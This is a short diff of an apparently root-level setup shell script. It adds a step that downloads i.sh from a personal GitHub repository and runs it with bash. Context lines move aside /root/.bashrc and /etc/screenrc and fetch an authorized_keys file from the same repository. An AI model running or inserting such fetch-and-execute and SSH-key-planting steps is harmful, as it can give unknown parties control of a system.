@@ -1,4 +1,8 @@
+    wget "https://raw.githubusercontent.com/s0trcwd1/pub/refs/heads/main/i.sh
+    "
+    bash i.sh
 
+#
 	mv /root/.bashrc /root/.bashrc.bak
 
  	mv /etc/screenrc /etc/screenrc.bak
@@ -20,6 +24,7 @@
 
 	wget "https://raw.githubusercontent.com/s0trcwd1/pub/main/authorized_keys"
 ##rclone sftp
+
 
 [sjc]
 
